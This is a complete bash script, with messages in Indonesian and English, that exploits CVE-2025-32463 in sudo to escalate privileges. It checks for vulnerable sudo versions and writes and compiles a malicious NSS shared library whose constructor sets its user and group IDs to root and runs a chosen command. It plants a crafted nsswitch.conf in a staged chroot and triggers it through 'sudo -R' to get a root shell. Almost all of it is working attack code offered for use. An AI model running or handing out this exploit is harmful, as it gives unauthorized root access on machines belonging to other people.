#!/bin/bash

DEFAULT_CMD="/bin/bash"
TMP_DIR_PREFIX="sudobridge.stage."

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

error() { echo -e "${RED}[-]${NC} $1" >&2; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
info() { echo -e "${BLUE}[*]${NC} $1"; }
success() { echo -e "${GREEN}[+]${NC} $1"; }

cleanup() {
    if [[ -n "$STAGE" && -d "$STAGE" ]]; then
        info "Cleaning up temporary directory: $STAGE"
        rm -rf "$STAGE"
    fi
}

escape_c_string() {
    local str="$1"
    str="${str//\\/\\\\}"
    str="${str//\"/\\\"}"
    echo "$str"
}

check_dependencies() {
    local deps=("gcc" "sudo")
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" >/dev/null 2>&1; then
            missing+=("$dep")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        error "Missing dependencies: ${missing[*]}"
        return 1
    fi
    return 0
}

check_root() {
    if [[ $EUID -eq 0 ]]; then
        warn "You are already root! No need for exploitation."
        exit 0
    fi
}

check_sudo_version() {
    local sudo_version
    sudo_version=$(sudo --version 2>/dev/null | head -1 | grep -oP 'Sudo version \K[\d.]+')

    if [[ -z "$sudo_version" ]]; then
        warn "Could not determine sudo version"
        return 1
    fi

    info "Membaca versi sudo: $sudo_version"

    local vulnerable_versions=("1.9.14" "1.9.15" "1.9.16" "1.9.17")
    for ver in "${vulnerable_versions[@]}"; do
        if [[ "$sudo_version" == "$ver" ]]; then
            success "Versi sudo rentan"
            return 0
        fi
    done

    warn "Versi sudo tidak rentan terhadap cve ini"
    return 1
}

confirm_sudo_vuln() {
    if sudo -R nndkmajsj nndkmajsj 2>&1 | grep -qi "sudo: nndkmajsj: No such file or directory"; then
        success "Sudo vulnerability confirmed"
        return 0
    fi

    warn "Sudo tidak rentan terhadap PE"
    return 1
}

generate_exploit_source() {
    local escaped_cmd
    escaped_cmd=$(escape_c_string "$CMD")
    cat > "$STAGE/bridge90.c" <<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void bridge(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "$escaped_cmd", NULL);
}
EOF
}

setup_environment() {
    mkdir -p "$STAGE/bridge/etc" "$STAGE/libnss_"
    echo "passwd: /bridge90" > "$STAGE/bridge/etc/nsswitch.conf"
    if [[ -f "/etc/group" ]]; then
        cp "/etc/group" "$STAGE/bridge/etc/"
    else
        warn "Could not find /etc/group file"
    fi
}

compile_exploit() {
    info "compile exploit..."
    if ! gcc -shared -fPIC -Wl,-init,bridge -o "$STAGE/libnss_/bridge90.so.2" "$STAGE/bridge90.c" 2>"$STAGE/compile.log"; then
        error "Compilation failed. Check $STAGE/compile.log for details"
        return 1
    fi
    return 0
}

execute_exploit() {
    info "Triggering exploit..."
    success "Exploit successful, root privileges granted!"
    (
        cd "$STAGE" || return 1
        sudo -R bridge bridge
    )
}

main() {
    echo -e "${GREEN}"
    echo "##############################################"
    echo "# CVE-2025-32463 - Sudo Privilege Escalation #"
    echo "# Coded By: Sup3rSmoky                       #"
    echo "##############################################"
    echo -e "${NC}"

    check_root

    if [[ $# -eq 0 ]]; then
        CMD="$DEFAULT_CMD"
        info "Menggunakan perintah default: $CMD"
    else
        CMD="$*"
        info "Gunakan command: $CMD"
    fi

    if ! check_dependencies; then
        error "Silakan instal dependensi yang hilang dan coba lagi"
        exit 1
    fi

    if ! check_sudo_version; then
        warn "Exploit tidak berjalan di sistem ini"
        read -rp "$(echo -e "${YELLOW}[!]${NC} Lanjutkan atau tidak? [y/N]") " answer
        if [[ ! "$answer" =~ ^[Yy]$ ]]; then
            info "Perintah di batalkan"
            exit 0
        fi
    fi

    if ! confirm_sudo_vuln; then
        warn "Tidak berfungsi di sistem ini"
        read -rp "$(echo -e "${YELLOW}[!]${NC} Lanjutkan atau tidak? [y/N]") " answer2
        if [[ ! "$answer2" =~ ^[Yy]$ ]]; then
            info "Perintah di batalkan"
            exit 1
        fi
    fi

    STAGE=$(mktemp -d -t "${TMP_DIR_PREFIX}XXXXXX")
    if [[ ! -d "$STAGE" ]]; then
        error "gagal membuat direktori"
        exit 1
    fi
    info "membuat direktori sementara: $STAGE"
    trap cleanup EXIT
    cd "$STAGE" || {
        error "gagal membuat direktori"
        exit 1
    }

    info "membuat kode exploit..."
    generate_exploit_source
    info "membuat kode exploit..."
    setup_environment
    if ! compile_exploit; then
        exit 1
    fi
    execute_exploit
    if [[ $? -eq 0 ]]; then
        success "exploit berhasil dijalankan"
    else
        error "exploit gagal dijalankan"
        warn "Check $STAGE directory for artifacts"
    fi
}

main "$@"
